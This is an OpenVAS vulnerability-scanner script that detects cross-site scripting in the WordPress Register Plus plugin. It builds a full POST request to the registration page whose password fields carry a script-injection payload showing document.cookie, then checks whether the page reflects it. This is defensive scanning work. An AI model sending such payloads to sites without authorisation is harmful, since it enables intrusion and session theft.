###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_register_plus_mult_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# WordPress Register Plus Plugin Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to execute arbitrary HTML
  and script code in a user's browser session in the context of an affected
  site.
  Impact Level: Application";
tag_affected = "WordPress Register Plus 3.5.1";
tag_insight = "The flaws are due to,
  - Input passed via the 'firstname', 'lastname', 'website', 'aim', 'yahoo',
    'jabber', 'about', 'pass1', and 'pass2' parameters to 'wp-login.php'
    (when 'action' is set to 'register') is not properly sanitised before being
    returned to the user.
  - A direct request to 'dash_widget.php' and 'register-plus.php' allows
    remote attackers to obtain installation path in an error message.";
tag_solution = "No solution or patch is available as of 20th December, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/register-plus/";
tag_summary = "The host is running WordPress Register Plus Plugin and is prone
  to multiple vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.801492";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_bugtraq_id(45057);
  script_cve_id("CVE-2010-4402", "CVE-2010-4403");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("WordPress Register Plus Plugin Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://websecurity.com.ua/4539");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42360");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/96143/registerplus-xss.txt");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/514903/100/0/threaded");

  script_description(desc);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_summary("Check if WordPress Register Plus Plugin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

if(dir != NULL)
{
  ## Try an exploit
  filename = string(dir + "/wp-login.php?action=register");
  host = get_host_name();
  authVariables = "user_login=abc&user_email=abc%40gmail&firstname=&lastname=" +
                  "&website=&aim=&yahoo=&jabber=&about=&pass1=%22%3E%3Cscript" +
                  "%3Ealert%28document.cookie%29%3C%2Fscript%3E&pass2=%22%3E%" +
                  "3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E";

  ## Construct post request
  sndReq2 = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8\r\n",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                   "Accept-Language: en-us,en;q=0.5\r\n",
                   "Accept-Encoding: gzip,deflate\r\n",
                   "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                   "Keep-Alive: 115\r\n",
                   "Connection: keep-alive\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Cookie: wordpress_test_cookie=WP+Cookie+check; wpss_firstvisit=1; wpss_safesearch=1\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);

  rcvRes2 = http_keepalive_send_recv(port:port, data:sndReq2);

  ## Check the response to confirm vulnerability
  if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes2) &&
            ("><script>alert(document.cookie)</script>" >< rcvRes2))
  {
      security_warning(port:port);
      exit(0);
  }
}
